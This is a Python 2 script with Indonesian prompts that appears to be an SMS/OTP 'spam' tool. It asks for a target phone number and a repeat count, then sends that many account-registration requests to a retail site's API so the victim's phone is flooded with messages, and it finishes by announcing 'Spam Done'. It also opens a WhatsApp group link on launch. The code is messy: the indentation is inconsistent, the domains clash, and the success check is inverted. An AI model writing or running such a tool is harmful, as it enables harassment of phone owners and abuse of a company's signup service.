import json,sys,time,random,os
from time import sleep
import datetime

try:
   import requests
except ModuleNotFoundError:
   print(' \x1b[97mSilahkan install dulu module requests: pip2 install requests')
   sys.exit()


def spin():
        try:
                L="/-\\|"
                for q in range(75):
                        time.sleep(0.1)
                        sys.stdout.write("\r \x1b[1;97m\x1b[1;91m#\x1b[1;97m \x1b[1;97mStarting [\x1b[1;92m"+L[q % len(L)]+"\x1b[1;97m]")
                        sys.stdout.flush()
        except:
                exit()

class Akugans:

        def __init__(self):
                self.ses = requests.Session()

        def gas(self,_____code08_____):
                agent = open("agent.txt","r").read()
                acak = random.choice(agent.split("\n"))
                head = {
                        "Host": "www.matahari.com",
                        "content-length": "238",
                        "x-requested-with": "XMLHttpRequest",
                        "x-requested-with": "XMLHttpRequest",
                        "content-type":"application/json","accept": "*/*",
                        "referer": "https://www.depop.com/customer/account/create/",
                        "accept-encoding":"gzip, deflate",
                        "accept-language": "id-ID,en-US;q=0.8"}

  		dat = json.dumps({"thor_customer":{"name":" AmmarBN","email_address":"mrs4ntuy04@gmail.com","mobile_country_code":"+62","gender_id":"1","mobile_number":_____code08_____,"mro":"","password":"Tahlita23","birth_date":"06/03/2003"}})

		ajig = self.ses.post("https://www.depop.com/rest/V1/thorCustomers",headers=head,data=dat)
		if "Succses" in ajig.text:
                        print(" \x1b[91m! \x1b[97mMaaf Error Silahkan Coba Lagi Nanti ")
                else:
                        print(" \x1b[92m \x1b[97mSent To \x1b[93m"+ _____code08_____ +" \x1b[97m\x1b[101m Subscribe AmmarBN \033[0m \x1b[92mSukses")

while True:
        try:
                user = raw_input("\033[1;93mHalo Siapa Nama Kamu : ")
		os.system('clear')
		print "(1) Halo",user,"Selamat Datang Di Tools Ini"
		time.sleep(2)
		print "(2)" ,user,"Sekarang Di Komunitas Kami Mempunyai Group Whatsapp"
		time.sleep(2)
		print "(3) Masuk Jika Ingin Join Ke Komunitas Kami"
		time.sleep(2)
		os.system("xdg-open https://chat.whatsapp.com/IvZ5ybt7gzz6rG7mAXZlIP")
		time.sleep(2)
		print "(4)Terimakasih Telah Join Sabar Lagi Login Tools"
		spin()
		os.system("clear")
                print("""
	\033[36m____ \033[1;37m___  _  _  \033[36m____ \033[1;37m_  _ ____ 
	\033[36m[__  \033[1;37m|__] |\/|  \033[36m[__  \033[1;37m|\/| [__
	\033[36m___] \033[1;37m|    |  |  \033[36m___] \033[1;37m|  | ___]

\033[1;30m<------------[ \033[1;33m+ INFORMATION \033[1;33m+ \033\033[1;30m]------------>
 \033[1;37m\033[31m*\033[1;37m Status\033[31m:\033[1;37m\033[1;32m ONLINE
 \033[1;37m\033[31m*\033[1;37m Pengguna\033[31m:\033[1;37m\033[1;32m 1 \033[1;37mUser
 \033[1;37m\033[31m*\033[1;37m Version\033[31m:\033[1;37m\033[1;37m 1\033[31m.\033[1;37m0.0
 \033[1;37m\033[31m*\033[1;37m Berhenti\033[31m:\033[1;37m\033[1;37m ctrl+c
\033[1;30m<------------[ \033[1;33m+ Creator Info \033[1;33m+ \033\033[1;30m]------------> 
 \x1b[97m{\x1b[95m*\x1b[97m} Creator \x1b[90m: \x1b[97mLord_Ammar
 \x1b[97m{\x1b[95m*\x1b[97m} Youtube \x1b[90m: \x1b[97mAmmarBN
 \x1b[97m{\x1b[95m*\x1b[97m} Github  \x1b[90m: \x1b[92mhttps://github.com/AmmarBN
 \x1b[97m{\x1b[95m*\x1b[97m} Team \x1b[90m: \x1b[97mPython Team
\x1b[91m+\x1b[90m----------------------------------------------\x1b[91m+\n
\033[1;30m<------------[ \033[1;33m+ Target Phone \033[1;33m+ \033\033[1;30m]------------>""")

                print(" \x1b[93m \x1b[97mExample \x1b[90m: \x1b[97m08xxxx ")
                _____code08_____ = raw_input(" \x1b[92m! \x1b[97mTarget  \x1b[90m: \x1b[93m")
                ____code62____ = raw_input(" \x1b[92m! \x1b[97mJumlah  \x1b[90m: \x1b[93m")
                print('')
                spin()
                print('\n')

                main=Akugans()
                for coli in range(int(____code62____)):
                                main.gas(_____code08_____)
                else:
                        print("\x1b[91m\x1b[92m\x1b[93m\x1b[95m\033[0m")
                print(" \x1b[97m{\x1b[95m~\x1b[97m} Spam Done Broo...")
                _____exec_____=raw_input(" \x1b[97m{\x1b[95m+\x1b[97m} Back To Spam ? y/n : ")
                if _____exec_____ =='y':
                        Akugans()
                elif _____exec_____ =='n':
                        print('\n \x1b[97mMAKASIH YA SAYANG UDAH MENGGUNAKAN SC INI JANGAN LUPA SUBS \n')
                        sys.exit()
        except Exception as Error:
                sys.exit(Error)
